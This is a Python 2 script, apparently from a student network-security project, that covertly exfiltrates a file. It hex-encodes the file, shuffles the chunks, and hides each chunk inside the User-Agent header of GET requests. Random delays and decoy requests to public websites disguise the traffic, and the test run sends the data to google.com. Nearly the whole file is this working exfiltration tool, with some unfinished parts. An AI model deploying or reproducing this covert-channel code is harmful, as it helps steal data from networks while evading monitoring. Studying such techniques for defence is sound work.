#!/usr/bin/env python
# -*- coding: utf-8 -*-

import httplib
import os
import binascii
import random
import time

# CONVERT FILE TO LIST OF POSITIONS AND CHUNKS OF HEXADECIMAL DATA

def convert_file_to_hex_string(filename):
	"""
	Converts a file into 
	param str filename:	name and path of the file to convert

	return str:		hex representation of the file
	"""
    
	bin_str = ""
    	
	with open(filename, "rb") as f:
        	bin_str = f.read()
    	
	hex_str = binascii.hexlify(bin_str)
	
	return hex_str


# takes in a byte string of type <class 'bytes'>

def hex_to_list_pos_data(hex_str):

    	#if len(h_string) % 4 != 0: # add "xx" to indicate that the last 2 byte chunk is too short
        #	h_string += "xx"
    
	
	n = 4
    	list_pos_data = [[i//n, hex_str[i:i+n]] for i in range(0, len(hex_str), n)] # break into 2 bytes
	random.shuffle(list_pos_data)
    
	return list_pos_data

### example use ###
# st = "hello from mars"
# hex_st = string_to_hex(st)
# print(hex_st)
# res = hex_to_2_byte_chunks(hex_st)
# print(res) --> [(3, '6672'), (1, '6c6c'), (4, '6f6d'), (2, '6f20'), (5, '206d'), (0, '6865'), (6, '6172'), (7, '73xx')]



def create_random_request():

	list_websites = ["www.vorlesungsverzeichnis.ethz.ch", "www.unil.ch", "www.google.com", "www.stackoverflow.com"]
	list_ressources = [["Vorlesungsverzeichnis/", "Vorlesungsverzeichnis/sucheDozierendePre.view?lang=en", "Vorlesungsverzeichnis/sucheLehrveranstaltungenPre.view?lang=en"],["index.html", "actu/home.html", ""],["index.html"],[]]

	server = random.choice(list_websites)

	conn = httplib.HTTPConnection(server)
	
	num_requests = random.randint(0,5)
	for i in range(num_requests):
		conn.request("GET", "/")
		conn.close()



def send_get_requests_with_data(server, ressource, list_pos_data, request_type):
	"""
	param str server:		ip or dns name of the server
	param str ressource		ressource to acces (example: '/index.html')
	param list list_pos_data:	list of (data positions, data chunk)
	param str request_type: 	"encryption", "key", "data" ? #TODO: to be changed

	return ??
	"""
	
	conn = httplib.HTTPConnection(server)
	
	results = []

	for i in range(0, len(list_pos_data)):
		
		time.sleep(random.random())

		create_random_request()		

		user_agent = "Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/" + str(list_pos_data[i][1]) + " Firefox/10.0"
		headers = {'User-Agent': user_agent, 'Accept': "*/*", 'accept-language': "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3"}
		ressource_fake = ressource + "?pos=" + str(list_pos_data[i][0]) + "&type=" + request_type
		conn.request("GET", ressource_fake, "", headers)
		
		# JUST FOR TEST, TO GET FEEDBACK
		res = conn.getresponse()
		output = res.read()
		results = results + [res.status, res.reason, output]

	return results



if __name__ == "__main__":

	filename = "/home/fanny/Documents/Workspace/Network-Security-Project-Fall-2018-master/file_to_send/super_secret.zip"
	
	hex_str = convert_file_to_hex_string(filename)
	print hex_str
	
	list_pos_data = hex_to_list_pos_data(hex_str)
	print list_pos_data	

	server = "www.google.com"
	ressource = "/index.html"
	request_type = "data"

	results = send_get_requests_with_data(server, ressource, list_pos_data, request_type)
	
	for result in results:
		print result




	#status, reason, output = create_get_request("www.google.com", "/index.html", "test")
	#print status
	#print reason
	#print output
